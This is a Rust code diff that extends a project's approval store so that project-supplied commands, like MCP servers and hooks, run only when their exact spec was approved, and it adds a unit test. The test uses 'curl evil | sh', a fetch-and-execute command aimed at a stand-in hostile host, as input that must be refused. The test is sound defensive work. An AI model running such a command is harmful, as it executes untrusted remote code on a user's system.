@@ -1,6 +1,6 @@
-//! The launches a user approved for a project: the MCP servers and hooks a
-//! project brings, which run programs (or send its keys to an address) and
-//! so start only once approved.
+//! The launches a user approved for a project: the MCP servers, hooks and
+//! commands a project brings, which run programs (or send its keys to an
+//! address) and so start only once approved.
 //!
 //! An approval is for one launch as it was shown: the whole of what starts
 //! it ([`McpServerConfig::launch_spec`], [`HookConfig::launch_spec`]). A
@@ -21,6 +21,8 @@ struct Approved {
     mcp: BTreeMap<String, String>,
     #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
     hooks: BTreeMap<String, String>,
+    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
+    commands: BTreeMap<String, String>,
 }
 
 /// The approvals of one project, kept in `path`. Without a path nothing is
@@ -87,6 +89,27 @@ impl Approvals {
         approved
             .hooks
             .insert(name.to_string(), config.launch_spec());
+        self.write(&approved)
+    }
+
+    /// Whether the project's command `name` may run as `spec` describes it
+    /// (the caller's one-line account of everything it runs).
+    #[must_use]
+    pub fn command_approved(&self, name: &str, spec: &str) -> bool {
+        self.read()
+            .commands
+            .get(name)
+            .is_some_and(|kept| kept == spec)
+    }
+
+    /// Approve the project's command `name` as `spec` describes it.
+    ///
+    /// # Errors
+    ///
+    /// When the approval cannot be kept.
+    pub fn approve_command(&self, name: &str, spec: &str) -> Result<(), String> {
+        let mut approved = self.read();
+        approved.commands.insert(name.to_string(), spec.to_string());
         self.write(&approved)
     }
 
@@ -185,6 +208,16 @@ mod tests {
         approvals.approve_hook("check", &hook).unwrap();
         let (run, held) = approvals.split_hooks(hooks);
         assert!(run.len() == 1 && held.is_empty());
+    }
+
+    #[test]
+    fn a_project_command_is_approved_as_it_reads() {
+        let dir = tempfile::tempdir().unwrap();
+        let approvals = Approvals::new(Some(dir.path().join("approved.toml")));
+        assert!(!approvals.command_approved("fmt", "cargo fmt"));
+        approvals.approve_command("fmt", "cargo fmt").unwrap();
+        assert!(approvals.command_approved("fmt", "cargo fmt"));
+        assert!(!approvals.command_approved("fmt", "curl evil | sh"));
     }
 
     #[test]
